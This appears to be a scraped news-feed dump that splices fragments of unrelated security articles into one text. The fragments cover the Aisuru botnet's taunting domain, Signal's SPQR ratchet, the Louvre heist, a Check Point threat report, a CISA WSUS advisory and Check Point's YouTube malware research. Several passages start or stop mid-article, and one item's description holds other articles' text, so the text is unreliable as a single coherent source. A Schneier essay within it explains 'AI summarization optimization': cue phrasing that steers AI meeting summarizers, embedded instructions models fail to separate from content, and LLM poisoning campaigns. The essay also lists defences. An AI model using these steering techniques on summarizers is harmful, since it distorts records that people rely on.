&lt;p&gt;In July, Google filed &lt;a href="https://www.courtlistener.com/docket/70683171/google-llc-v-does-1-25/" rel="noopener" target="_blank"&gt;a lawsuit&lt;/a&gt; in New York federal court against the Badbox botnet&amp;#8217;s alleged perpetrators. Google said the Badbox 2.0 botnet &amp;#8220;compromised more than 10 million uncertified devices running Android&amp;#8217;s open-source software, which lacks Google&amp;#8217;s security protections. Cybercriminals infected these devices with pre-installed malware and exploited them to conduct large-scale ad fraud and other digital crimes.&amp;#8221;&lt;/p&gt;
&lt;h2&gt;A FAMILIAR DOMAIN NAME&lt;/h2&gt;
&lt;p&gt;Brundage said the Aisuru botmasters have their own SDK, and for some reason part of its code tells many newly-infected systems to query the domain name &lt;strong&gt;fuckbriankrebs[.]com&lt;/strong&gt;. This may be little more than an elaborate &amp;#8220;screw you&amp;#8221; to this site&amp;#8217;s author: One of the botnet&amp;#8217;s alleged partners goes by the handle &amp;#8220;&lt;strong&gt;Forky&lt;/strong&gt;,&amp;#8221; and was &lt;a href="https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/" rel="noopener" target="_blank"&gt;identified in June by KrebsOnSecurity as a young man from Sao Paulo, Brazil&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Brundage noted that only systems infected with Aisuru&amp;#8217;s Android SDK will be forced to resolve the domain. Initially, there was some discussion about whether the domain might have some utility as a &amp;#8220;kill switch&amp;#8221; capable of disrupting the botnet&amp;#8217;s operations, although Brundage and others interviewed for this story say that is unlikely.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72457" style="width: 745px;"&gt;&lt;img alt="" class="wp-image-72457 " height="707" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/fbk-seralys-r.png" width="735" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72457"&gt;A tiny sample of the traffic after a DNS server was enabled on the newly registered domain fuckbriankrebs dot com. Each unique IP address requested its own unique subdomain. Image: Seralys.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;For one thing, they said, if the domain was somehow critical to the operation of the botnet, why was it still unregistered and actively for-sale? Why indeed, we asked. Happily, the domain name was deftly snatched up last week by &lt;strong&gt;Philippe Caturegli&lt;/strong&gt;, &amp;#8220;chief hacking officer&amp;#8221; for the security intelligence company &lt;a href="https://seralys.com/" rel="noopener" target="_blank"&gt;Seralys&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Caturegli enabled a passive DNS server on that domain and within a few hours received more than 700,000 requests for &lt;a href="https://z3zhnw7npvig.fuckbriankrebs.com/" rel="noopener" target="_blank"&gt;unique subdomains on fuckbriankrebs[.]com&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;But even with that visibility into Aisuru, it is difficult to use this domain check-in feature to measure its true size, Brundage said. After all, he said, the systems that are phoning home to the domain are only a small portion of the overall botnet.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The bots are hardcoded to just spam lookups on the subdomains,&amp;#8221; he said. &amp;#8220;So anytime an infection occurs or it runs in the background, it will do one of those DNS queries.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72463" style="width: 758px;"&gt;&lt;img alt="" class=" wp-image-72463" height="800" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/cat-fbk.png" width="748" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72463"&gt;Caturegli briefly configured all subdomains on fuckbriankrebs dot com to display this ASCII art image to visiting systems today.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The domain fuckbriankrebs[.]com has a storied history. On its initial launch in 2009, it was &lt;a href="https://krebsonsecurity.com/2010/01/tough-talk-from-those-who-hide/" rel="noopener" target="_blank"&gt;used to spread malicious software by the &lt;/a&gt;&lt;a href="https://krebsonsecurity.com/?s=cutwail" rel="noopener" target="_blank"&gt;Cutwail&lt;/a&gt;&lt;a href="https://krebsonsecurity.com/2010/01/tough-talk-from-those-who-hide/" rel="noopener" target="_blank"&gt; spam botnet&lt;/a&gt;. In 2011, the domain was involved in a notable DDoS against this website from a botnet powered by &lt;strong&gt;Russkill&lt;/strong&gt; (a.k.a. &amp;#8220;Dirt Jumper&amp;#8221;).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Domaintools.com&lt;/strong&gt; finds that in 2015, fuckbriankrebs[.]com was registered to an email address attributed to &lt;strong&gt;David &amp;#8220;Abdilo&amp;#8221; Crees&lt;/strong&gt;, a 27-year-old Australian man &lt;a href="https://databreaches.net/2025/05/17/australian-national-known-as-dr32-sentenced-in-u-s-federal-court/" rel="noopener" target="_blank"&gt;sentenced in May 2025 to time served&lt;/a&gt; for cybercrime convictions related to the &lt;a href="https://krebsonsecurity.com/?s=lizard+squad" rel="noopener" target="_blank"&gt;Lizard Squad hacking group&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt; The Signal engineers have given this third ratchet the formal name: Sparse Post Quantum Ratchet, or SPQR for short. The third ratchet was designed in collaboration with &lt;a href="https://pqshield.com"&gt;PQShield&lt;/a&gt;, &lt;a href="https://www.aist.go.jp/index_en.html"&gt;AIST&lt;/a&gt;, and New York University. The developers &lt;a href="https://eprint.iacr.org/2025/078"&gt;presented&lt;/a&gt; the erasure-code-based chunking and the high-level Triple Ratchet design at the Eurocrypt 2025 conference. At the Usenix 25 conference, they &lt;a href="https://www.usenix.org/system/files/usenixsecurity25-auerbach.pdf"&gt;discussed&lt;/a&gt; the six options they considered for adding quantum-safe forward secrecy and post-compromise security and why SPQR and one other stood out. Presentations at the &lt;a href="https://csrc.nist.gov/Presentations/2025/post-quantum-ratcheting-for-signal"&gt;NIST PQC Standardization Conference&lt;/a&gt; and the &lt;a href="https://youtu.be/WhTLjKzkK9c"&gt;Cryptographic Applications Workshop&lt;/a&gt; explain the details of chunking, the design challenges, and how the protocol had to be adapted to use the standardized ML-KEM.&lt;/p&gt;
&lt;p&gt;Jacomme further observed: &lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The final thing interesting for the triple ratchet is that it nicely combines the best of both worlds. Between two users, you have a classical DH-based ratchet going on one side, and fully independently, a KEM-based ratchet is going on. Then, whenever you need to encrypt something, you get a key from both, and mix it up to get the actual encryption key. So, even if one ratchet is fully broken, be it because there is now a quantum computer, or because somebody manages to break either elliptic curves or ML-KEM, or because the implementation of one is flawed, or…, the Signal message will still be protected by the second ratchet. In a sense, this update can be seen, of course simplifying, as doubling the security of the ratchet part of Signal, and is a cool thing even for people that don’t care about quantum computers.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Professional jewelry thieves were not impressed with the four. Here&amp;#8217;s &lt;a href="https://www.nytimes.com/2025/10/25/world/europe/louvre-heist-jewelry-thieves.html"&gt;Larry Lawton&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&amp;#8220;I robbed 25, 30 jewelry stores&amp;#8212;20 million, 18 million, something like that,&amp;#8221; Mr. Lawton said. &amp;#8220;Did you know that I never dropped a ring or an earring, no less, a crown worth 20 million?&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;He thinks that they had a compatriot on the inside.&lt;/p&gt;
&lt;p&gt;Museums, especially smaller ones, are good targets for theft because they rarely secure what they hold to its true value. They can&amp;#8217;t; it would be prohibitively expensive. This makes them an attractive target.&lt;/p&gt;
&lt;p&gt;We might find out soon. It looks like some people have been &lt;a href="https://www.nytimes.com/2025/10/26/world/europe/louvre-heist-arrests.html"&gt;arrested&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Not being out of the country&amp;#8212;out of the EU&amp;#8212;by now was sloppy. Leaving DNA evidence was sloppy. I can hope the criminals were sloppy enough not to have disassembled the jewelry by now, but I doubt it. They were probably taken apart within hours of the theft.&lt;/p&gt;
&lt;p&gt;The whole thing is sad, really. Unlike stolen paintings, those jewels have no value in their original form. They need to be &lt;a href="https://www.cbsnews.com/news/louvre-robbery-stolen-jewels-jeweler-paris-france/"&gt;taken apart&lt;/a&gt; and sold in pieces. But then their value drops considerably&amp;#8212;so the end result is that most of the worth of those items disappears. It would have been much better to pay the thieves not to rob the Louvre.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=71093</guid><category>Uncategorized</category><category>France</category><category>operational security</category><category>theft</category></item><item><title>27th October – Threat Intelligence Report</title><link>https://research.checkpoint.com/2025/27th-october-threat-intelligence-report/</link><description>&lt;p&gt;For the latest discoveries in cyber research for the week of 27th October, please download our Threat Intelligence Bulletin.

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Toys “R” Us Canada has &lt;a href="https://cyberpress.org/toys-r-us-canada-confirms-data-breach/"&gt;suffered&lt;/a&gt; a data breach that resulted in stolen customer records being leaked on the dark web. The compromised data affects an undisclosed number of individuals and includes names, physical addresses, email addresses, and phone numbers, while account passwords and financial details were not exposed. No threat actor has claimed responsibility yet.&lt;/li&gt;
&lt;li&gt;Japanese retailer Askul has &lt;a href="https://therecord.media/askul-japan-retailer-cyberattack-disruption"&gt;been&lt;/a&gt; a victim of a ransomware attack that resulted in system failures and the suspension of all online orders, user registrations, and product shipments across its three e-commerce sites. The incident disrupted logistics operations for major retailers including Muji, Loft, and Sogo &amp;amp; Seibu, and may have led to a possible leak of personal and customer data.&lt;/li&gt;
&lt;li&gt;Swedish security company Verisure has &lt;a href="https://cybernews.com/security/verisure-data-breach/"&gt;confirmed&lt;/a&gt; a data breach that resulted in unauthorized access to customer data held by its subsidiary, Alert Alarm. The attack affected systems managed by an external billing partner and led to the compromise of names, addresses, email addresses, and social security numbers of around 35,000 current and former Alert Alarm customers in Sweden.&lt;/li&gt;
&lt;li&gt;Oregon-based Jewett-Cameron Trading company has &lt;a href="https://www.scworld.com/brief/ransomware-attack-disrupts-jewett-cameron-operations"&gt;experienced&lt;/a&gt; a cyber-attack that resulted in the theft of video meeting images, non-public financial documents, and IT information after hackers breached and encrypted parts of its internal corporate systems. The incident materially impacted on the company’s operations and may affect its financial results.&lt;/li&gt;
&lt;li&gt;Kaufman County, near Dallas, &lt;a href="https://therecord.media/cyber-incidents-texas-tennessee-indiana"&gt;disclosed&lt;/a&gt; a cyberattack that shut down multiple county systems, especially courthouse computers. The disruption affected services for nearly 200,000 residents and coincided with similar incidents hitting public payment systems and municipal operations in La Vergne, Tennessee; DeKalb County, Indiana; and the Chester County Library System in Pennsylvania.&lt;/li&gt;
&lt;li&gt;Password manager LastPass was &lt;a href="https://blog.lastpass.com/posts/possible-cryptochameleon-social-engineering-campaign-targeting-lastpass-customers-and-more"&gt;hit&lt;/a&gt; by a phishing campaign impersonating inheritance request, luring users to enter master passwords and passkeys on fake sites. The attack exposed credentials, endangered vaults and synced authentication methods, and led to about $4.4M in crypto thefts. The financially motivated threat actor CryptoChameleon (UNC5356) was responsible for the attack.&lt;/li&gt;
&lt;li&gt;Several European defense manufacturers, including UAV/drone firms, have &lt;a href="https://www.eset.com/us/about/newsroom/research/north-korean-lazarus-group-targets-drone-sector-europe/?srsltid=AfmBOopalRgns_Dxu42Vos89EZRRn9LizYq7A1XSlmGaVbLqGO0oOdBV"&gt;experienced&lt;/a&gt; a cyber-attack that resulted in ScoringMathTea RAT infections via trojanized GitHub projects and fake job-offer lures, enabling remote control and theft of proprietary UAV designs and manufacturing know-how. Corporate systems were compromised, and sensitive weapons-system data was likely exposed. The attack is attributed to North Korea–linked Lazarus group.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2025-33073, a Windows SMB Client elevation-of-privilege flaw, is being &lt;a href="https://www.helpnetsecurity.com/2025/10/21/cisa-warns-of-windows-smb-flaw-under-active-exploitation-cve-2025-33073/"&gt;exploited&lt;/a&gt; to gain SYSTEM privileges on Windows and Windows Server. Exploitation coerces SMB authentication via a crafted script, bypasses NTLM reflection mitigations, and can enable authenticated RCE when SMB signing isn’t enforced. The flaw was patched in June 2025, and PoC exploits are publicly available.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;Microsoft &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287"&gt;released&lt;/a&gt; out of band security update to mitigate critical Windows Server Update Service vulnerability, CVE-2025-59287. This vulnerability was first patched as part of October Patch Tuesday, while out of band emergency update on October 23 was released to better address this critical flaw.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(Microsoft Windows Server Update Service Remote Code Execution (CVE-2025-59287)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Active exploitation of the critical SessionReaper vulnerability (CVE-2025-54236) has been &lt;a href="https://thehackernews.com/2025/10/over-250-magento-stores-hit-overnight.html"&gt;observed&lt;/a&gt; targeting Adobe Commerce (Magento), affecting versions 2.4.9-alpha2 through 2.4.4-p15 and earlier. The flaw lets attackers hijack sessions via the REST API without user interaction, often dropping PHP webshells on default session storage. Over 60% of Magento stores remain unpatched.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;Check Point Research &lt;a href="https://research.checkpoint.com/2025/youtube-ghost-network/"&gt;uncovered&lt;/a&gt; and analyzed the YouTube Ghost Network, a sophisticated and coordinated collection of malicious accounts operating on YouTube. These accounts systematically take advantage of YouTube’s features to promote malicious content, ultimately distributing malware while creating a false sense of trust among viewers. Notable malware families involved included Lumma Infostealer, Rhadamanthys, HijackLoader, and RedLine.&lt;/li&gt;

&lt;p&gt;But clever meeting attendees can manipulate this system’s record by speaking more to what the underlying AI weights for summarization and importance than to their colleagues. As a result, you can expect some meeting attendees to use language more likely to be captured in summaries, timing their interventions strategically, repeating key points, and employing formulaic phrasing that AI models are more likely to pick up on. Welcome to the world of AI summarization optimization (AISO).&lt;/p&gt;
&lt;h3 class="wp-block-heading" id="optimizing-for-algorithmic-manipulation"&gt;Optimizing for algorithmic manipulation&lt;/h3&gt;
&lt;p&gt;AI summarization optimization has a well-known precursor: SEO.&lt;/p&gt;
&lt;p&gt;Search-engine optimization is as old as the World Wide Web. The idea is straightforward: Search engines scour the internet digesting every possible page, with the goal of serving the best results to every possible query. The objective for a content creator, company, or cause is to optimize for the algorithm search engines have developed to determine their webpage rankings for those queries. That requires writing for two audiences at once: human readers and the search-engine crawlers indexing content. Techniques to do this effectively are passed around like trade secrets, and a &lt;a href="https://www.grandviewresearch.com/industry-analysis/seo-software-market-report#:~:text=The%20global%20SEO%20software%20market%20size%20was,and%20heightened%20competition%20in%20the%20digital%20landscape."&gt;$75 billion&lt;/a&gt; industry offers SEO services to organizations of all sizes.&lt;/p&gt;
&lt;p&gt;More recently, researchers have documented techniques for influencing AI responses, including &lt;a href="https://www.schneier.com/blog/archives/2024/04/the-rise-of-large.html%22%3Elarge-language%20model%20optimization"&gt;large-language model optimization&lt;/a&gt; (LLMO) and &lt;a href="https://arxiv.org/abs/2311.09735"&gt;generative engine optimization&lt;/a&gt; (GEO). Tricks include content optimization&amp;#8212;adding citations and statistics&amp;#8212;and adversarial approaches: using specially crafted text sequences. These techniques often target sources that LLMs heavily reference, such as Reddit, which is claimed to be &lt;a href="https://www.visualcapitalist.com/ranked-the-most-cited-websites-by-ai-models/"&gt;cited in 40%&lt;/a&gt; of AI-generated responses. The effectiveness and real-world applicability of these methods remains limited and largely experimental, although there is substantial evidence that countries such as Russia are &lt;a href="https://www.atlanticcouncil.org/blogs/new-atlanticist/exposing-pravda-how-pro-kremlin-forces-are-poisoning-ai-models-and-rewriting-wikipedia/"&gt;actively&lt;/a&gt; &lt;a href="https://thebulletin.org/2025/03/russian-networks-flood-the-internet-with-propaganda-aiming-to-corrupt-ai-chatbots/"&gt;pursuing&lt;/a&gt; &lt;a href="https://www.washingtonpost.com/technology/2025/04/17/llm-poisoning-grooming-chatbots-russia/"&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;AI summarization optimization follows the same logic on a smaller scale. Human participants in a meeting may want a certain fact highlighted in the record, or their perspective to be reflected as the authoritative one. Rather than persuading colleagues directly, they adapt their speech for the notetaker that will later define the “official” summary. For example:&lt;/p&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;“The main factor in last quarter’s delay was supply chain disruption.”&lt;/li&gt;
&lt;li&gt;“The key outcome was overwhelmingly positive client feedback.”&lt;/li&gt;
&lt;li&gt;“Our takeaway here is in alignment moving forward.”&lt;/li&gt;
&lt;li&gt;“What matters here is the efficiency gains, not the temporary cost overrun.”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The techniques are subtle. They employ high-signal phrases such as “key takeaway” and “action item,” keep statements short and clear, and repeat them when possible. They also use contrastive framing (“this, not that”), and speak early in the meeting or at transition points.&lt;/p&gt;
&lt;p&gt;Once spoken words are transcribed, they enter the model’s input. Cue phrases&amp;#8212;and even transcription errors&amp;#8212;can steer what makes it into the summary. In many tools, the output format itself is also a signal: Summarizers often offer sections such as “Key Takeaways” or “Action Items,” so language that mirrors those headings is more likely to be included. In effect, well-chosen phrases function as implicit markers that guide the AI toward inclusion.&lt;/p&gt;
&lt;p&gt;Research confirms this. Early AI summarization research &lt;a href="https://arxiv.org/abs/1509.00685"&gt;showed&lt;/a&gt; &lt;a href="https://arxiv.org/abs/1912.08777"&gt;that&lt;/a&gt; models trained to reconstruct summary-style sentences systematically overweigh such content. Models over-rely on &lt;a href="https://arxiv.org/abs/1912.11602"&gt;early-position&lt;/a&gt; &lt;a href="https://arxiv.org/pdf/1909.04028.pdf"&gt;content&lt;/a&gt; in news. And models often overweigh statements at the &lt;a href="https://arxiv.org/abs/2310.10570"&gt;start or end&lt;/a&gt; of a transcript, underweighting the middle. Recent work further confirms vulnerability to phrasing-based manipulation: models &lt;a href="https://arxiv.org/abs/2312.14197"&gt;cannot reliably&lt;/a&gt; distinguish embedded instructions from ordinary content, especially when phrasing mimics salient cues.&lt;/p&gt;
&lt;h3 class="wp-block-heading" id="how-to-combat-aiso"&gt;How to combat AISO&lt;/h3&gt;
&lt;p&gt;If AISO becomes common, three forms of defense will emerge. First, meeting participants will exert social pressure on one another. When researchers secretly deployed AI bots in Reddit’s r/changemyview community, users and moderators responded with &lt;a href="https://retractionwatch.com/2025/04/28/experiment-using-ai-generated-posts-on-reddit-draws-fire-for-ethics-concerns/"&gt;strong backlash&lt;/a&gt; calling it “&lt;a href="https://www.science.org/content/article/unethical-ai-research-reddit-under-fire"&gt;psychological manipulation&lt;/a&gt;.” Anyone using obvious AI-gaming phrases may face similar disapproval.&lt;/p&gt;
&lt;p&gt;Second, organizations will start governing meeting behavior using AI: risk assessments and access restrictions before the meetings even start, detection of AISO techniques in meetings, and validation and auditing after the meetings.&lt;/p&gt;
&lt;p&gt;Third, AI summarizers will have their own technical countermeasures. For example, the AI security company CloudSEK &lt;a href="https://www.cloudsek.com/blog/trusted-my-summarizer-now-my-fridge-is-encrypted----how-threat-actors-could-weaponize-ai-summarizers-with-css-based-clickfix-attacks"&gt;recommends&lt;/a&gt; content sanitization to strip suspicious inputs, prompt filtering to detect meta-instructions and excessive repetition, context window balancing to weight repeated content less heavily, and user warnings showing content provenance.&lt;/p&gt;
&lt;p&gt;Broader defenses could draw from security and AI safety research: &lt;a href="https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html"&gt;preprocessing content&lt;/a&gt; to detect dangerous patterns, &lt;a href="https://github.com/usefulmove/ConsensusLLM"&gt;consensus approaches&lt;/a&gt; requiring consistency thresholds, &lt;a href="https://arxiv.org/abs/2410.02584"&gt;self-reflection techniques&lt;/a&gt; to detect manipulative content, and &lt;a href="https://arxiv.org/html/2407.19098v1"&gt;human oversight protocols&lt;/a&gt; for critical decisions. Meeting-specific systems could implement additional defenses: &lt;a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2020/04/MeetingNet_EMNLP_full.pdf"&gt;tagging inputs by provenance&lt;/a&gt;, &lt;a href="https://aclanthology.org/2022.aacl-short.6.pdf"&gt;weighting content&lt;/a&gt; by speaker role or centrality with sentence-level importance scoring, and discounting high-signal phrases while favoring consensus over fervor.&lt;/p&gt;
&lt;h3 class="wp-block-heading" id="reshaping-human-behavior"&gt;Reshaping human behavior&lt;/h3&gt;
&lt;p&gt;AI summarization optimization is a small, subtle shift, but it illustrates how the adoption of AI is reshaping human behavior in unexpected ways. The potential implications are quietly profound.&lt;/p&gt;
&lt;p&gt;Meetings&amp;#8212;humanity’s most fundamental collaborative ritual&amp;#8212;are being silently reengineered by those who understand the algorithm’s preferences. The articulate are gaining an invisible advantage over the wise. Adversarial thinking is becoming routine, embedded in the most ordinary workplace rituals, and, as AI becomes embedded in organizational life, strategic interactions with AI notetakers and summarizers may soon be a necessary executive skill for navigating corporate culture.&lt;/p&gt;
&lt;p&gt;AI summarization optimization illustrates how quickly humans adapt communication strategies to new technologies. As AI becomes more embedded in workplace communication, recognizing these emerging patterns may prove increasingly important.&lt;/p&gt;

&lt;p&gt;Microsoft released an update to address a critical remote code execution vulnerability impacting Windows Server Update Service (WSUS) in Windows Server (2012, 2016, 2019, 2022, and 2025), &lt;a href="https://www.cve.org/CVERecord?id=CVE-2025-59287" target="_blank" title="CVE-2025-59287"&gt;CVE-2025-59287&lt;/a&gt;, that a prior update did not fully mitigate.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(Updated October 29, 2025):&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CISA strongly urges organizations to implement Microsoft’s updated &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287" target="_blank" title="Windows Server Update Service (WSUS) Remote Code Execution Vulnerability"&gt;Windows Server Update Service (WSUS) Remote Code Execution Vulnerability&lt;/a&gt; guidance, &lt;a href="https://www.cisa.gov/news-events/alerts/2025/10/24/microsoft-releases-out-band-security-update-mitigate-windows-server-update-service-vulnerability-cve#Notes" title="Notes"&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/a&gt; or risk an unauthenticated actor achieving remote code execution with SYSTEM-level privileges. Immediate actions for organizations with affected products are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Identify servers vulnerable to exploitation (i.e., affected servers with WSUS Server Role enabled and ports open to TCP 8530/TCP 8531) for priority mitigation:
&lt;ol&gt;
&lt;li&gt;Run the following command in PowerShell to check if WSUS is in an installed state: &lt;code&gt;Get-WindowsFeature -Name UpdateServices&lt;/code&gt;; and/or&lt;/li&gt;
&lt;li&gt;Leverage the Server Manager Dashboard, and check if WSUS enablement is turned on as a Server Role.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Apply the out-of-band security update released on October 23, 2025, to all servers identified in Step 1. Reboot WSUS server(s) after installation to complete mitigation. If organizations are unable to apply the update immediately, system administrators should disable the WSUS Server Role and/or block inbound traffic to ports TCP 8530/TCP 8531, the default listeners for WSUS, at the host firewall. Of note, do not undo either of these workarounds until your organization has installed the update.&lt;/li&gt;
&lt;li&gt;Apply updates to remaining Windows servers. Reboot servers after installation to complete mitigation.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In addition to checking for endpoint security platform events, CISA recommends that potentially affected organizations investigate signs of threat activity on their networks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Monitor and vet suspicious activity and child processes spawned with SYSTEM-level permissions, particularly those originating from &lt;code&gt;wsusservice.exe&lt;/code&gt; and/or &lt;code&gt;w3wp.exe&lt;/code&gt;. Keep in mind:
&lt;ul&gt;
&lt;li&gt;These child processes may represent legitimate activity; and&lt;/li&gt;
&lt;li&gt;Exploitation of CVE-2025-59287 on the target system could involve additional services beyond WSUS parent processes.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Monitor and vet nested PowerShell processes using base64-encoded PowerShell commands.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;(End of Update)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CISA added CVE-2025-59287 to its&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities (KEV) Catalog&lt;/a&gt; on October 24, 2025.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/youtube-ghost-network/"&gt;Dissecting YouTube’s Malware Distribution Network&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt;&amp;nbsp;Antonis Terefos (&lt;a href="https://x.com/Tera0017"&gt;&lt;strong&gt;@Tera0017&lt;/strong&gt;&lt;/a&gt;)&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Key Points&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Check Point Research uncovered and analyzed the YouTube Ghost Network, a sophisticated and coordinated collection of malicious accounts operating on YouTube. These accounts systematically take advantage of YouTube’s features to promote malicious content, ultimately distributing malware while creating a false sense of trust among viewers.&lt;/li&gt;



&lt;li&gt;Our investigation identified and reported more than &lt;strong&gt;3,000&lt;/strong&gt; malicious videos associated with this network. The majority of these videos have been removed, significantly reducing the threat to the broader digital ecosystem. The network appears to be active at least since &lt;strong&gt;2021,&lt;/strong&gt; maintaining a steady output of malicious content each year. Notably, in &lt;strong&gt;2025&lt;/strong&gt;, the creation of such videos has &lt;strong&gt;tripled&lt;/strong&gt;, highlighting both the scalability and increasing effectiveness of this malware distribution campaign.&lt;/li&gt;



&lt;li&gt;The network primarily targets the &lt;strong&gt;“Game Hacks/Cheats”&lt;/strong&gt; and &lt;strong&gt;“Software Cracks/Piracy”&lt;/strong&gt; categories, areas that continue to attract large numbers of potential victims. It is important to emphasize that the use of cracked software is illegal and that such versions frequently contain hidden malware. The most viewed malicious video in our dataset targets &lt;strong&gt;Adobe Photoshop&lt;/strong&gt;, with &lt;strong&gt;293,000 views&lt;/strong&gt; and &lt;strong&gt;54 comments&lt;/strong&gt;, while the second most viewed targets &lt;strong&gt;FL Studio&lt;/strong&gt;, with &lt;strong&gt;147,000 views&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;Prior to the disruption of the &lt;strong&gt;Lumma infostealer&lt;/strong&gt; between March and May 2025, Lumma was the most frequently distributed malware within this network. Following this disruption, we observed a shift in threat actor tactics, with &lt;strong&gt;Rhadamanthys&lt;/strong&gt; becoming the preferred infostealer. Overall, the majority of malware distributed via the YouTube Ghost Network consists of information-stealing malware (infostealers), posing a significant risk to user credentials and sensitive data.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;br /&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;In recent years, threat actors have continuously adapted their tactics to discover new and effective methods for malware distribution. While email remains one of the most prominent infection vectors, its effectiveness has diminished due to widespread deployment of security solutions and increased user awareness. Consequently, attackers have sought alternative avenues to reach their targets more efficiently. One notable shift has been the use of &lt;strong&gt;malicious Google Ads campaigns&lt;/strong&gt;, which redirect unsuspecting users to phishing pages designed to deliver malware. Through this approach, attackers cast a wide phishing net, luring users with seemingly legitimate “advertised” content.&lt;/p&gt;



&lt;p&gt;More recently, Check Point Research has identified a further evolution in this threat landscape, the emergence of &lt;strong&gt;Ghost Networks&lt;/strong&gt; across multiple platforms. A Ghost Network is defined as a collection of fake or “ghost” accounts operating as a service, manipulating platform engagement mechanisms to disguise malicious activities as benign and enable large-scale malware distribution. The first fully documented instance of such a network was the &lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/"&gt;&lt;strong&gt;Stargazers Ghost Network&lt;/strong&gt;&lt;/a&gt;, which operates on GitHub. In this case, ghost accounts host malicious repositories that appear trustworthy, deceiving victims into downloading malicious software.&lt;/p&gt;



&lt;p&gt;In this publication, Check Point Research examines another Ghost Network, this time operating on &lt;strong&gt;YouTube&lt;/strong&gt;, which leverages over 3,000 malicious videos with the primary objective of distributing malware. Accounts within these networks are often compromised, and legitimate content is frequently hijacked to host malicious material. These videos typically receive &lt;strong&gt;positive engagement&lt;/strong&gt;, such as likes and encouraging comments, fostering a false sense of trust among viewers. The most frequently targeted content categories are &lt;strong&gt;“Game Hacks/Cheats”&lt;/strong&gt; and &lt;strong&gt;“Software Cracks/Piracy”&lt;/strong&gt;, which continue to attract a substantial number of potential victims, despite the fact that cracking software is illegal and cracked versions often carry hidden malware.&lt;/p&gt;



&lt;p&gt;Activity associated with this network appears to have initiated around &lt;strong&gt;2021&lt;/strong&gt;, coinciding with a marked increase in malicious YouTube videos and likely indicating the &lt;strong&gt;network’s inception&lt;/strong&gt;. From 2021 through &lt;strong&gt;2024&lt;/strong&gt;, the volume of such videos remained relatively stable. However, in &lt;strong&gt;2025&lt;/strong&gt;, despite the year not yet being complete, the number of malicious videos has already &lt;strong&gt;tripled compared to previous years&lt;/strong&gt;, highlighting a &lt;strong&gt;significant upward trend&lt;/strong&gt; and underscoring the &lt;strong&gt;growing effectiveness&lt;/strong&gt; of this distribution method.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;YouTube Ghost Network&lt;/h2&gt;



